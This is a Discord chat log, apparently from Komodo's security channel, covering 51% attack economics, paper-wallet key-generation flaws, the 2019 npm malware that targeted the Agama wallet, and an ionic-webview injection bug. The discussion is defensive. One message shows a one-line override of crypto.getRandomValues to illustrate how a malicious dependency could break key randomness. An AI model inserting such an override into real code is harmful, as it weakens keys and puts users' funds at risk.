+[30-Mar-19 07:03 AM] ComputerGenie#7004
+`But that would make confirmations as slow as on BTC....`
+*only* to that 1st number, after that confirms = blocks
+if you need 20 confirms, as a general rule, that will equal 20 blocks
+
+
+[30-Mar-19 07:04 AM] yope#8519
+Well... I have only spent 2 hours or so looking at the whitepaper and the code on github.
+
+
+[30-Mar-19 07:04 AM] yope#8519
+I am far from convinced yet.
+
+
+[30-Mar-19 07:05 AM] ComputerGenie#7004
+not even sure 2 hrs is enough time to look at the PoS code, much less the code from a security aspect
+
+
+[30-Mar-19 07:06 AM] yope#8519
+Absolutely right
+
+
+[30-Mar-19 07:06 AM] yope#8519
+That's why I say I am far from convinced.
+
+
+[30-Mar-19 07:07 AM] yope#8519
+I don't think Komodo has had enough scrutiny and attack by a big margin to say anything about the security.
+
+
+[30-Mar-19 07:08 AM] yope#8519
+You mean the EMC2 attack?
+
+
+[30-Mar-19 07:09 AM] yope#8519
+There are contradicting stories about that, so I don't know who to believe...
+
+
+[30-Mar-19 07:09 AM] ComputerGenie#7004
+I can think of 5 things that were done just because of an attack theory and with any due respect, the EMC2 "attack" was laughable
+
+
+[30-Mar-19 07:11 AM] yope#8519
+Ok, but it depends on how you look at that... if you see a trend there of "successful attack --> fixed", then we can expect more successful attacks, right 😉
+
+
+[30-Mar-19 07:14 AM] yope#8519
+Thanks a lot for helping me out. I will investigate further. If I have more questions, I'll be back.
+
+
+[30-Mar-19 07:14 AM] ComputerGenie#7004
+@yope I'm not naive enough to believe that there are 0 vectors, just sure that the idea you were asking about isn't one of them
+
+
+[30-Mar-19 07:15 AM] yope#8519
+Ah, but back to my original question: Isn't there a sort of FAQ or other document with answers to these questions, which I assume I am by far not the only one asking?
+
+
+[30-Mar-19 07:17 AM] CryptoNinjaa#5350
+https://blog.komodoplatform.com/delayed-proof-of-work-explained-9a74250dbb86
+
+{Embed}
+https://blog.komodoplatform.com/delayed-proof-of-work-explained-9a74250dbb86
+Delayed Proof of Work Explained
+It’s 2018, and we have recently witnessed many 51% attacks (Double Spending) on various Proof of Work (PoW) based blockchains.
+https://images-ext-1.discordapp.net/external/K-fpW1anfp5YdwJNtQrc0KoC9uSWbu_VQfCUCRd8pbw/https/cdn-images-1.medium.com/max/1200/1%2AUdeyCiUcELkn4pWfADKEMA.jpeg
+
+{Reactions}
+👌 ☝ 
+
+[30-Mar-19 07:18 AM] yope#8519
+I don't think my reasoning is very special... I am a noob at blockcahin code still, and if I can come up with such a question in 2 hours of investigation, many others should also, given enough critical eyes look at this project.
+
+
+[30-Mar-19 07:20 AM] yope#8519
+Thanks, @CryptoNinjaa , but I have already seen that article.... will read it more thorooughly.
+
+{Reactions}
+👍 
+
+[30-Mar-19 07:20 AM] yope#8519
+Until now I have found little deep technical details in it.
+
+
+[30-Mar-19 07:20 AM] Markus#5464
+How come KMD dont make a private blockchain and notarize to it? then no btc would be required to be spent and notarizing would be literally for free
+
+
+[30-Mar-19 07:21 AM] Markus#5464
+but having 64 notary nodes is sort of centralized aswell if we think that way
+
+
+[30-Mar-19 07:22 AM] Markus#5464
+i get ur point ^^
+
+
+[30-Mar-19 07:22 AM] Markus#5464
+was just a idea
+
+
+[30-Mar-19 07:24 AM] ComputerGenie#7004
+`How come KMD dont make a private blockchain and notarize to it?`
+One of the reasons I can think of is "what if it becomes known/compromised?", if that ever happened, security would be nonexistent (and the de/centralized thing)
+
+
+[30-Mar-19 07:24 AM] Markus#5464
+ye i quess
+
+
+[30-Mar-19 07:25 AM] yope#8519
+That's centralized.
+
+
+[30-Mar-19 07:25 AM] Markus#5464
+hmm
+
+
+[30-Mar-19 07:25 AM] ComputerGenie#7004
+`privately controled, authorized chain` would be one way to get rid of the troll known as @ComputerGenie 😛
+
+{Reactions}
+💯 
+
+[30-Mar-19 07:26 AM] yope#8519
+But you cannot compare the 64 NN's to the mining network of bitcoin in terms of centralization.
+
+
+[30-Mar-19 07:27 AM] yope#8519
+How? There are a few bigger mining pools, but there are still a lot of individual miners...
+
+
+[30-Mar-19 07:27 AM] yope#8519
+in each pool
+
+
+[30-Mar-19 07:29 AM] yope#8519
+No, they can't
+
+
+[30-Mar-19 07:29 AM] ComputerGenie#7004
+`a lot of individual miners...
+in each pool`
+each of them are generally meaningless in the system, as they generally don't control nodes for more than 1-4 minute intervals
+
+
+[30-Mar-19 07:29 AM] yope#8519
+Consensus is spread through the network
+
+
+[30-Mar-19 07:30 AM] yope#8519
+How?
+
+
+[30-Mar-19 07:30 AM] ComputerGenie#7004
+1 pool with 5000 miners that = 500 PH is no different, in any way, than 1 pool with 1 miner who has 500 PH
+
+{Reactions}
+☝ 
+
+[30-Mar-19 07:32 AM] yope#8519
+No.
+
+
+[30-Mar-19 07:32 AM] yope#8519
+The individual miners are.
+
+
+[30-Mar-19 07:33 AM] ComputerGenie#7004
+yes, in a consensus manner; because, almost no miners ever know what consensus code their pool is running
+which makes the miners moot
+
+
+[30-Mar-19 07:34 AM] yope#8519
+Still, the bitcoin network would reject a block with incorrect transactions in it...
+
+
+[30-Mar-19 07:34 AM] ComputerGenie#7004
+there's more to consensus than just tx confirmation
+
+
+[30-Mar-19 07:36 AM] ComputerGenie#7004
+it's entirely possible for Core to create consensus code that disallows any blocks to connect that are created by ClientX, just on client tag and nothing else (all else being equal)
+
+
+[30-Mar-19 07:36 AM] ComputerGenie#7004
+assuming pools run agreeing code
+
+
+[30-Mar-19 07:37 AM] ComputerGenie#7004
+consensus code, literally, defines what is/isn't acceptable
+
+
+[30-Mar-19 07:38 AM] ComputerGenie#7004
+`if pool owners really want to double spend or censor transactions, they can`
+the latter is exceptionally easy
+
+
+[30-Mar-19 07:40 AM] ComputerGenie#7004
+As much as I like to bag on Core, I think they would rollback an economically significant ds
+
+
+[30-Mar-19 07:40 AM] ComputerGenie#7004
+indeed
+
+
+[30-Mar-19 07:41 AM] yope#8519
+Some reports say, that right now it would cost you 1.4 billion USD to 51% attack the bitcoin network...
+
+
+[30-Mar-19 07:41 AM] yope#8519
+Gains would need to be vastly higher than that.
+
+
+[30-Mar-19 07:42 AM] ComputerGenie#7004
+I still 1/2 wonder why Bitmain hasn't done it 😛
+
+
+[30-Mar-19 07:42 AM] yope#8519
+They can't. Bitmain is almost bankrupt.
+
+
+[30-Mar-19 07:42 AM] yope#8519
+No it is not for free. They still pay electricity
+
+
+[30-Mar-19 07:43 AM] ComputerGenie#7004
+You underestimate the power of *not* selling mining equipment 😛
+
+
+[30-Mar-19 07:43 AM] yope#8519
+I still don't think it is that easy that pool owners can collude while miners just keep obeying them.
+
+
+[30-Mar-19 07:44 AM] yope#8519
+Why do you think that is possible?
+
+
+[30-Mar-19 07:45 AM] ComputerGenie#7004
+I'd estimate that 80% of miners wouldn't know anything that happened unless it was on reddit or twatter, and even then I don't think they'd understand
+
+
+[30-Mar-19 07:46 AM] ComputerGenie#7004
+the majority of miners don't even understand the basics and a large portion have never even had a client and/or privkey
+
+
+[30-Mar-19 07:47 AM] yope#8519
+Yes, but I don't think that pool owners get hold of the blocks. If it was like that, someone would have called them out long ago.
+
+
+[30-Mar-19 07:49 AM] yope#8519
+The article you linked even says it: Pool owners concentrate hash power, but don't control it.
+
+
+[30-Mar-19 07:51 AM] ComputerGenie#7004
+` If it was like that, someone would have called them out long ago.`
+People ignore what they want, BM has been "called out" 1000 times for "covert" things and no one cares (partly because no direct evidence, partly because they just don't care as long as they get their $2)
+
+
+[30-Mar-19 07:52 AM] yope#8519
+https://bitcoinmagazine.com/articles/op-ed-bitcoin-mining-attacks-are-overblown/
+
+{Embed}
+https://bitcoinmagazine.com/articles/op-ed-bitcoin-mining-attacks-are-overblown/
+Op Ed: Bitcoin Mining Attacks Are Overblown
+The question here is whether bitcoin mining is a single point of failure. Could a government or other authority control Bitcoin through controlling a single entity in mining? What would it actually take to “take over”?
+https://images-ext-2.discordapp.net/external/EXl_xzzOxSaLLyB6aIXpjNA2Ko7pSXJ2XO1yLb-zJKo/https/fs.bitcoinmagazine.com/img/images/jimmy_mining.max-800x800.jpg
+
+
+[30-Mar-19 07:52 AM] ComputerGenie#7004
+If I do a 51% and you "call me out", what good is your claim unless you can actively show what I did?
+
+
+[30-Mar-19 07:54 AM] yope#8519
+@ComputerGenie What I meant by calling out is that if pool owners actually could control the hashing power they concentrate, that would be a known fact by now.
+
+
+[30-Mar-19 07:56 AM] ComputerGenie#7004
+`if pool owners actually could control the hashing power they concentrate, that would be a known fact by now.`
+You mean like the literal pages slush has allowing miners to vote on consensus options?
+
+
+[30-Mar-19 07:56 AM] ComputerGenie#7004
+vs
+other pools do whatever and miners don't know
+
+
+[30-Mar-19 07:58 AM] ComputerGenie#7004
+"control" is a broad term
+
+
+[30-Mar-19 07:58 AM] yope#8519
+https://news.bitcoin.com/a-51-attack-on-bitcoin-means-mutually-assured-destruction/
+
+{Embed}
+https://news.bitcoin.com/a-51-attack-on-bitcoin-means-mutually-assured-destruction/
+A 51% Attack on Bitcoin Means Mutually Assured Destruction - Bitco...
+What would happen if bitcoin were to suffer a 51% attack? It’s a hypothetical question, but one that has troubled some of the community’s brightest minds.
+https://images-ext-1.discordapp.net/external/oaGeaTTgvmzhV20aGfj8SCo2q2th485So0I6QPUl1Gk/https/news.bitcoin.com/wp-content/uploads/2018/03/bitmain-asic.jpg
+
+
+[30-Mar-19 07:59 AM] yope#8519
+Sorry guys, I have to go now. Interesting discussion. Thanks to all.
+
+{Reactions}
+👋 
+
+[30-Mar-19 07:59 AM] ComputerGenie#7004
+Of the title, I tend to agree and think that's why BM never did it
+
+
+[30-Mar-19 08:13 AM] ComputerGenie#7004
+I'm loathe to admit that I don't see that "more profitable coin" in the near future ☹
+
+
+[30-Mar-19 08:19 AM] ComputerGenie#7004
+While I admit that the current architecture likely wouldn't allow for it to happen again, I'm still morally opposed to a mutable chain
+
+
+[30-Mar-19 08:29 AM] ComputerGenie#7004
+I think it could happen, but I don't think that would be the rally cry (too man fanboys and too many will never grasp what's wrong with Core control anyway)
+
+
+[27-Apr-19 03:18 AM] Mylo#8306
+https://www.youtube.com/watch?v=RijGNytjbOI&feature=youtu.be
+
+{Embed}
+DEFCONConference
+https://www.youtube.com/watch?v=RijGNytjbOI&feature=youtu.be
+DEF CON 26 CRYPTO AND PRIVACY VILLAGE - Scott Arciszewski - No Way...
+https://images-ext-1.discordapp.net/external/tMTe6FE37LOb4CUnfZfT7ds-vpdWS7oHMihD6HtfgSs/https/i.ytimg.com/vi/RijGNytjbOI/maxresdefault.jpg
+
+
+[27-Apr-19 03:22 AM] Mylo#8306
+tl;dw;
+The past three years of vulnerability research and cryptanalysis has not been kind to the JOSE family of Internet standards (most commonly known as JSON Web Tokens a.k.a. JWT). This has led to many security experts declaring boldly, "Don't use JWT!" but has left many developers in want of a viable alternative.
+
+
+[28-Apr-19 12:19 PM] CryptoFoxGaming#5228
+If there is any need for someone trained in network and transport layer security, let me know.
+
+
+[28-Apr-19 08:23 PM] Mylo#8306
+Dockerhub apparently.
+
+{Reactions}
+troll_lol (2) 
+
+[07-May-19 05:14 AM] CryptoFoxGaming#5228
+Interesting read that may have blockchain applications:
+
+https://www.helpnetsecurity.com/2019/05/07/handshake-style-encryption/
+
+{Embed}
+https://www.helpnetsecurity.com/2019/05/07/handshake-style-encryption/
+Cryptographic breakthrough allows using handshake-style encryption...
+Researchers have solved a 15-year-old problem that allows handshake-style encryption to be used for time-delayed digital communications such as email.
+https://images-ext-1.discordapp.net/external/ailxPYVox-6OgGikM0wyCTYt1QwlmCr-Wz79B0g3M5E/https/www.helpnetsecurity.com/wp-content/uploads/2019/05/encryption.jpg
+
+
+[18-May-19 01:24 PM] phm87#7395
+https://twitter.com/ChristopherA/status/1129766926119559169
+
+{Embed}
+Christopher Allen (@ChristopherA)
+https://twitter.com/ChristopherA/status/1129766926119559169
+You can brute force open a password protected pkzip file for any password 16 chars or less using an Amazon cloud server for about 15 hours, costing ~$375 ($25 an hour). Don’t store bitcoin recovery keys in a pkzip unless they are worth less than that! https://t.co/SkJ1BH...
+Likes
+168
+Twitter
+
+
+[18-May-19 01:24 PM] phm87#7395
+https://twitter.com/hashcat/status/1129441728761610242
+
+{Embed}
+hashcat (@hashcat)
+https://twitter.com/hashcat/status/1129441728761610242
+Support for PKZIP Master Key added to #hashcat with an insane guessing rate of 22.7 ZettaHash/s on a single RTX 2080Ti. All passwords up to length 15 in less than 15 hours with only 4 GPUs! Excellent contribution from @s3inlc and @EU_ScienceHub https://t.co/kVUDBrQWM3
+Retweets
+342
+Likes
+593
+https://images-ext-1.discordapp.net/external/8POHOf4kElLEa5WYYf3L4v-fs0eO3TIBZ4esXVVcxPM/https/pbs.twimg.com/media/D6yVQYVXkAEcQsr.png%3Alarge
+Twitter
+
+
+[18-May-19 01:25 PM] phm87#7395
+(I wanted to post in security channel but I did not find one so I posted here)
+
+{Reactions}
+👌 (2) 
+
+[18-May-19 03:07 PM] ComputerGenie#7004
+`Don’t store bitcoin recovery keys in a pkzip unless they are worth less than that!`
+an app that hasn't been updated since Vista can be cracked by modern servers, who'da thunk it 😮
+
+
+[21-May-19 01:45 PM] vicmao#2684
+Hi @everyone. 
+
+After more than 4 months of trying to have BAY listed on the OEX exchange, we have had to concede to the fact that they have stolen our listing fee and will not be listing us. 
+We have tried many times to get an exact date of listing and each time there has been a delay with various excuses.
+Knowing we have had 3 BTC stolen which could have been spent on marketing or put towards another exchange listing is very frustrating. We will look into legal options to try and recover the fees, as long as it isn’t too expensive of course.
+Please feel free to share this news on social media or other chats, and let’s help to make sure no other projects are scammed into losing money from this exchange.
+
+
+[21-May-19 01:48 PM] vicmao#2684
+Beware of OEX exchnge... BitBay paíd a listing fee, haven't been listed and they don't Payback It back. I'm a Komodo holder and a BitBay holder too. 
+I just wanted to let you know and warn you.
+
+
+[21-May-19 01:48 PM] vicmao#2684
+Let's hope nobody else is scammed
+
+
+[21-May-19 01:48 PM] ComputerGenie#7004
+@vicmao How's that related to KMD security related topics for all Komodo APIs, web, wallets, dapps?
+
+
+[21-May-19 01:49 PM] vicmao#2684
+Sorry if it's not the place. I just wanted to share it
+
+
+[21-May-19 01:50 PM] vicmao#2684
+Delete It or warn whoever could interest this
+
+
+[21-May-19 01:50 PM] vicmao#2684
+Sorry again
+
+
+[21-May-19 02:05 PM] vicmao#2684
+@Deleted User 👍
+
+
+[24-May-19 12:58 PM] KomodoWorld#8282
+https://medium.com/mycrypto/disclosure-key-generation-vulnerability-found-on-walletgenerator-net-potentially-malicious-3d8936485961
+
+{Embed}
+https://medium.com/mycrypto/disclosure-key-generation-vulnerability-found-on-walletgenerator-net-potentially-malicious-3d8936485961
+Disclosure: Key generation vulnerability found on WalletGenerator....
+If you have used a private key generated on WalletGenerator.net after August 17, 2018, move your funds immediately to a secure address.
+https://images-ext-2.discordapp.net/external/0WFTabJ_2qV9VmJudhesaNedU64yE5FNCQS2qjB8CkE/https/cdn-images-1.medium.com/max/1200/1%2AVY9rK6iJe2NIsFWeXBCSZA.png
+
+
+[24-May-19 01:02 PM] KomodoWorld#8282
+Wallergenerator.net isn't that used for the paperwallet ? Could be important
+
+
+[24-May-19 01:04 PM] jl777c#5810
+NEVER NEVER NEVER use an online website to generate privkeys
+
+
+[24-May-19 01:06 PM] jl777c#5810
+easier to just send your coins directly to hollowman
+
+{Reactions}
+😂 abusedsmily 
+
+[24-May-19 01:18 PM] KomodoWorld#8282
+yes that's stated in the instructions, I made a few paperwallets in the past but always offline in a live ubuntu cd
+
+
+[24-May-19 01:33 PM] KomodoWorld#8282
+If the rng is compromised the paperwallet is at risk even when properly generated offline. Anyway the kmd version was forked long before the period mentioned, so it should be safe
+
+
+[24-May-19 05:41 PM] ComputerGenie#7004
+```Step 0. Follow the security checklist recommendation
+
+First step is to download this website from Github and open the index.html file directly from your computer. It's just too easy to sneak some evil code in the 6000+ lines of javascript to leak your private key, and you don't want to see your fund stolen. Code version control make it much easier to cross-check what actually run. For extra security, unplug your Internet access while generating your wallet. ```
+
+
+[24-May-19 05:42 PM] ComputerGenie#7004
+Guess you get what you get when you don't follow instructions?
+
+
+[24-May-19 09:27 PM] KomodoWorld#8282
+I asked and indeed it applies only to people who opened the website and disconnected from internet. Not the right way to use it. Downloading from github was always safe
+
+
+[05-Jun-19 06:17 AM] Andy#1801
+I am also curious
+
+
+[05-Jun-19 06:18 AM] Andy#1801
+In times like these wallets should stick together to solve the issue.
+
+
+[05-Jun-19 06:18 AM] jl777c#5810
+if you use agama code from this year, then likely you are affected, if not, then very likely not as it appears agama was specifically targeted
+
+
+[05-Jun-19 06:19 AM] Andy#1801
+Is there a roadmap for when you plan to publicly announce the technical details? If it's not possible to get any details beforehand, I would at least like to know when I need to be awake to react immediately.
+
+
+[05-Jun-19 06:19 AM] Andy#1801
+We do not use any agama specific code though
+
+
+[05-Jun-19 06:21 AM] jl777c#5810
+it was an exploit that targeted a specific agama variable name
+
+
+[05-Jun-19 06:25 AM] Andy#1801
+Having one of our js dependencies target our app is one of my worst nightmares.
+
+
+[05-Jun-19 06:25 AM] Andy#1801
+Hope nobody loses their money in this one
+
+
+[05-Jun-19 06:28 AM] jl777c#5810
+seems about 10% of addresses we could not save
+
+
+[05-Jun-19 06:30 AM] Andy#1801
+damn
+
+
+[05-Jun-19 06:30 AM] KomodoWorld#8282
+could those be people that moved the coins to a new address on their own? I just did with mine
+
+
+[05-Jun-19 06:30 AM] KomodoWorld#8282
+even if I always used native
+
+
+[05-Jun-19 06:32 AM] jl777c#5810
+we have a few cases where we know the attacker took the funds as the user was in transit and not online
+
+
+[05-Jun-19 06:35 AM] Andy#1801
+I'm very interested in how the exact exploit looks like and what we as a wallet-developer-community can do to prevent those
+
+
+[05-Jun-19 06:36 AM] Andy#1801
+When can we expect an announcement?
+
+{Reactions}
+🍻 
+
+[05-Jun-19 06:40 AM] jl777c#5810
+i heard that a CVE will be published in a few hours
+
+
+[05-Jun-19 06:40 AM] jl777c#5810
+after that, then we can disclose more details
+
+
+[05-Jun-19 06:57 AM] Andy#1801
+ok good to hear
+
+
+[05-Jun-19 07:46 AM] Deleted User#0000
+any more info on the vulneraility?
+
+
+[05-Jun-19 07:47 AM] Deleted User#0000
+which libraries are affected?
+
+
+[05-Jun-19 07:47 AM] Deleted User#0000
+oh hi @Andy
+
+
+[05-Jun-19 07:49 AM] Deleted User#0000
+guess i just asked the same question as others
+
+
+[05-Jun-19 08:03 AM] Deleted User#0000
+is this a backdoor type situation?
+
+
+[05-Jun-19 08:03 AM] Deleted User#0000
+like with dash copay?
+
+
+[05-Jun-19 08:03 AM] Deleted User#0000
+targetted at agama?
+
+
+[05-Jun-19 08:04 AM] Deleted User#0000
+https://github.com/KomodoPlatform/Agama/blob/master/package.json looking at this mess it's like it was bound to happen
+
+{Embed}
+https://github.com/KomodoPlatform/Agama/blob/master/package.json
+KomodoPlatform/Agama
+Discontinued software - DONT USE - only for educational purpose - KomodoPlatform/Agama
+https://images-ext-2.discordapp.net/external/RDvx2WIoH0iRzE_70DuHLDOM6rqONFcnMd4HT0XBnOI/%3Fs%3D400%26v%3D4/https/avatars2.githubusercontent.com/u/21276113
+
+
+[05-Jun-19 08:12 AM] Andy#1801
+hi @Deleted User 😃
+
+
+[05-Jun-19 08:13 AM] Andy#1801
+Dependency management is very difficult. I mean they use a lot of custom repos, which is actually good if they are the ones maintaining them
+
+
+[05-Jun-19 08:13 AM] Andy#1801
+And very bad if it's just a random repo
+
+
+[05-Jun-19 08:13 AM] jl777c#5810
+yes, agama was specifically targeted with an exploit in an upstream module
+
+
+[05-Jun-19 08:14 AM] Andy#1801
+I've been thinking a lot about how we can make apps more secure and not (or less) vulnerable to those kind of attacks. But it's hard...
+
+
+[05-Jun-19 08:14 AM] Andy#1801
+There is basically no way of protecting yourself unless you can ensure that your code is run BEFORE ANY OTHER CODE, which is just not the case in most situations...
+
+
+[05-Jun-19 08:14 AM] Deleted User#0000
+how bout not using 10 different bitcoinjs forks when bitgo one supports most of alts out of box
+
+
+[05-Jun-19 08:15 AM] Deleted User#0000
+also two sha256 modules when js does that already
+
+
+[05-Jun-19 08:15 AM] Andy#1801
+Well yeah that is definitely true ;).
+
+
+[05-Jun-19 08:15 AM] Deleted User#0000
+but that’s just my opinion
+
+
+[05-Jun-19 08:15 AM] Andy#1801
+But we'll see where the hack originated
+
+
+[05-Jun-19 08:16 AM] Andy#1801
+They said it's something specifically targeted at agama, so maybe `agama-wallet-lib`?
+
+
+[05-Jun-19 08:18 AM] Andy#1801
+Last week I've gone down the rabbit hole of trying to secure our library and sadly I wasn't satisfied with the options we have. Is anyone else interested in starting a small group where we can discuss best-practices regarding dependency management, specifically in the crypto space?
+
+
+[05-Jun-19 08:19 AM] Andy#1801
+It happened to bitpay, now to agama. We found a vulnerability that was luckily never exploited, but it affected bitpay, Ark, our wallet. So it's only a matter of time until it happens again.
+
+
+[05-Jun-19 08:23 AM] Andy#1801
+I don't know who else is here, we have 3 wallets and the app from unko. I know that the maintainer of web3 would also be interested to talk about that.
+
+
+[05-Jun-19 09:15 AM] Deleted User#0000
+@Andy what vulnerability?
+
+
+[05-Jun-19 10:23 AM] Deleted User#0000
+can anyone ping me when the CVE is released? am developer of largest tipbot on discord rn and i'd like to know my users are not affected
+
+
+[05-Jun-19 10:25 AM] jl777c#5810
+unless you used agama code, you are safe
+
+
+[05-Jun-19 10:27 AM] Deleted User#0000
+oki
+
+
+[05-Jun-19 01:10 PM] Deleted User#0000
+CVE released yet?
+
+
+[05-Jun-19 01:11 PM] jl777c#5810
+havent seen it yet
+
+
+[05-Jun-19 01:11 PM] jl777c#5810
+they did remove the offending package
+
+
+[05-Jun-19 01:11 PM] jl777c#5810
+so if your code builds fine now, it means for sure you are not affected
+
+
+[05-Jun-19 01:12 PM] Deleted User#0000
+@jl777c what was the package?
+
+
+[05-Jun-19 02:13 PM] Andy#1801
+@Deleted User We found a bug in the native implementation of the `ionic-webview` plugin. To serve the content, they started an internal server. But this server is accessible to the whole operating system, so if you manage to start your own server before it, then someone could inject any code into your app. Granted, it's not that easy to exploit. But not only crypto-currency related apps were affected, we even found a microsoft app that was affected. Here's a small proof of concept video we made: https://www.youtube.com/watch?v=RR1r323otOQ
+
+{Embed}
+papersDev
+https://www.youtube.com/watch?v=RR1r323otOQ
+Copay - vulnerability cordova-plugin-ionic-webview for iOS
+https://images-ext-1.discordapp.net/external/IEKyIzD4wyViARX6fAL5Pt10HyRylP2mVQcoGfDEmSQ/https/i.ytimg.com/vi/RR1r323otOQ/hqdefault.jpg
+
+
+[05-Jun-19 02:13 PM] Deleted User#0000
+well that's hella hard to exploit
+
+
+[05-Jun-19 02:14 PM] Deleted User#0000
+how is the port determined
+
+
+[05-Jun-19 02:14 PM] Deleted User#0000
+for the app?
+
+
+[05-Jun-19 02:14 PM] Andy#1801
+You will have to release an app to the app store, but the webserver keeps running for minutes after the app has been suspended
+
+
+[05-Jun-19 02:14 PM] Andy#1801
+You can set it in the config, but everyone leaves it on the default
+
+
+[05-Jun-19 02:15 PM] Andy#1801
+But the webserver is now gone from the plugin, so this is not an issue anymore
+
+
+[05-Jun-19 02:16 PM] Andy#1801
+And it might seem like it's hard to exploit, but if you release some kind of "companion app" for bitpay, for example a contact book or something that then deeplinks into bitpay (not sure if they enabled it), then it would be very easy and completely invisible to the user.
+
+
+[05-Jun-19 02:16 PM] Deleted User#0000
+true
+
+
+[05-Jun-19 02:17 PM] Andy#1801
+But the apps we reported it to did fix it fast, so it was all good
+
+
+[05-Jun-19 02:17 PM] Andy#1801
+That attack would also have to be planned really well, so I guess it's easier to just inject code into some random npm dependency 😃
+
+
+[05-Jun-19 02:18 PM] Andy#1801
+Do you manually review (the code) of the dependencies you use?
+
+
+[05-Jun-19 02:18 PM] Andy#1801
+I have always taken a look at the dependencies we use (author, if it's maintained, etc.), but you would also have to check the compiled code on npm to be completely sure
+
+
+[05-Jun-19 02:19 PM] Andy#1801
+I'm now thinking about simply copy/pasting the dependencies directly into our app, at least the ones that don't have too many dependencies themselves
+
+
+[05-Jun-19 02:19 PM] Andy#1801
+And then you just have to check updates manually
+
+
+[05-Jun-19 02:20 PM] Andy#1801
+Ideally there would be a way to "recursively" add dependencies directly from github, so it would always pull the source rather than some minified version
+
+
+[05-Jun-19 02:21 PM] Andy#1801
+But you would still have to review every sub dependency...
+
+
+[05-Jun-19 02:22 PM] Andy#1801
+It's like, once you go down that rabbit hole, you'll probably only be doing dependency review the whole day. But especially in our field it is getting more and more important.
+
+
+[05-Jun-19 02:24 PM] Andy#1801
+Anyway, I'm curious how this attack looked like exactly, then we can think about how we can protect ourselves from it in the future.
+
+{Reactions}
+💯 
+
+[05-Jun-19 02:24 PM] Deleted User#0000
+i don't really hhave many dependencies
+
+
+[05-Jun-19 02:25 PM] Andy#1801
+Have you checked how many you have in total (including sub-dependencies)?
+
+
+[05-Jun-19 02:25 PM] Deleted User#0000
+i use package lock etc
+
+
+[05-Jun-19 02:25 PM] Andy#1801
+Can a package on npm not be changed once hit has been released? (a specific version)
+
+
+[05-Jun-19 02:26 PM] Deleted User#0000
+well a version cannot be overriden i believe
+
+
+[05-Jun-19 02:26 PM] Andy#1801
+And if then probably the hash would change in the package lock
+
+
+[05-Jun-19 02:26 PM] Deleted User#0000
+use package lock and you will be stuck with the same versions, even on sub-modules
+
+
+[05-Jun-19 02:26 PM] Andy#1801
+but then you still have to review the code that is hosted on NPM
+
+
+[05-Jun-19 02:27 PM] Deleted User#0000
+i only use a custom fork of bitcoinjs-lib and bip32 for crypto operations
+
+
+[05-Jun-19 02:27 PM] Andy#1801
+the scary part is that any package can just overwrite critical functions, even if you use your own libs for the critical functions
+
+
+[05-Jun-19 02:28 PM] Andy#1801
+One could simply do `crypto.getRandomValues = () => { return 1 }` somewhere, and then your libs would probably use that...
+
+
+[05-Jun-19 02:28 PM] Deleted User#0000
+scoping bro
+
+
+[05-Jun-19 02:28 PM] Deleted User#0000
+lol
+
+
+[05-Jun-19 02:28 PM] Andy#1801
+that doesn't work
+
+
+[05-Jun-19 02:28 PM] Deleted User#0000
+really
+
+
+[05-Jun-19 02:29 PM] Andy#1801
+it might be different in node
+
+
+[05-Jun-19 02:29 PM] Andy#1801
+but in the browser you can overwrite window.crypto.getRandomValues and it is changed EVERYWHERE it is used
+
+
+[05-Jun-19 02:29 PM] Andy#1801
+The only thing you can do is create a secure copy of that function at the beginning of your code, so in the case of an app in your index.html
+
+
+[05-Jun-19 02:29 PM] Deleted User#0000
+i generated my seed outside of my app anyway
+
+
+[05-Jun-19 02:30 PM] Andy#1801
+hopefully there was no code injected there 😉
+
+
+[05-Jun-19 02:30 PM] Deleted User#0000
+into my node repl?
+
+
+[05-Jun-19 02:30 PM] Deleted User#0000
+dont htihnk so
+
+
+[05-Jun-19 02:31 PM] Andy#1801
+yeah then it's probably pretty safe 😛
+
+
+[05-Jun-19 02:31 PM] Andy#1801
+(unless you distrust node + dependencies or your hardware RNG), but at some point you just have to trust something/someone...
+
+
+[05-Jun-19 02:31 PM] Deleted User#0000
+true
+
+
+[05-Jun-19 02:32 PM] Andy#1801
+There is an interesting TC39 proposal open that would solve this problem by introducing proper scoping, or "realms" into javascript: https://github.com/tc39/proposal-realms
+
+{Embed}
+https://github.com/tc39/proposal-realms
+tc39/proposal-realms
+ECMAScript Proposal, specs, and reference implementation for Realms - tc39/proposal-realms
+https://images-ext-2.discordapp.net/external/LvczN5frNgSQn59djKv0PtL0PYqXoD93cN77KmTS_wo/%3Fs%3D400%26v%3D4/https/avatars3.githubusercontent.com/u/1725583
+
+
+[05-Jun-19 02:33 PM] Deleted User#0000
+well i'm working with node so i can just use child processes i guess
+
+
+[05-Jun-19 02:33 PM] Andy#1801
+lucky you 😉
+
+
+[05-Jun-19 02:34 PM] Andy#1801
+I also thought about using WebWorkers, but guess what, someone can simply overwrite `window.WebWorker`...
+
+
+[05-Jun-19 02:34 PM] Deleted User#0000
+hmm
+
+
+[05-Jun-19 02:34 PM] Deleted User#0000
+i know discord locks window.localStorage somehow
+
+
+[05-Jun-19 02:35 PM] Deleted User#0000
+see how they do that
+
+
+[05-Jun-19 02:35 PM] Andy#1801
+Yeah you can use Object.freeze to make objects immutable (to some extent)
+
+
+[05-Jun-19 02:35 PM] Andy#1801
+But then again, `Object.freeze = () => {}`
+
+
+[05-Jun-19 02:35 PM] Andy#1801
+But I'll look into that
+
+
+[05-Jun-19 02:36 PM] Andy#1801
+I assume they make a copy of that function somewhere in the beginning.
+
+
+[06-Jun-19 12:51 AM] jl777c#5810
+https://blog.npmjs.org/post/185397814280/plot-to-steal-cryptocurrency-foiled-by-the-npm
+
+{Embed}
+The npm Blog
+https://blog.npmjs.org/post/185397814280/plot-to-steal-cryptocurrency-foiled-by-the-npm
+Plot to steal cryptocurrency foiled by the npm security team
+Yesterday, the npm, Inc. security team, in collaboration with Komodo, helped protect over $13 million USD in cryptocurrency assets as we found and responded to a malware threat targeting the users of...
+https://images-ext-1.discordapp.net/external/0fHWIi0aI1yh8SayBX4jjNV8Gxn-B8TymlDFG8sB4WQ/https/i.ytimg.com/vi/6Guadww8CnU/hqdefault.jpg
+
+
+[06-Jun-19 11:35 AM] BigSlim#9710
+Hello
+
+
+[06-Jun-19 11:35 AM] BigSlim#9710
+Thank you for awesome product
+
+
+[06-Jun-19 11:38 AM] gcharang#6833
+@BigSlim you seem to be in the wrong discord. This one is "Komodo Platform"
+
+
+[06-Jun-19 11:40 AM] BigSlim#9710
+Ah yea my bad
+
+
+[06-Jun-19 11:40 AM] BigSlim#9710
+Just realized that
+
+
+[06-Jun-19 11:40 AM] BigSlim#9710
+Lol
+
+
+[06-Jun-19 11:40 AM] BigSlim#9710
+👍🏼
+
+
+[06-Jun-19 11:40 AM] BigSlim#9710
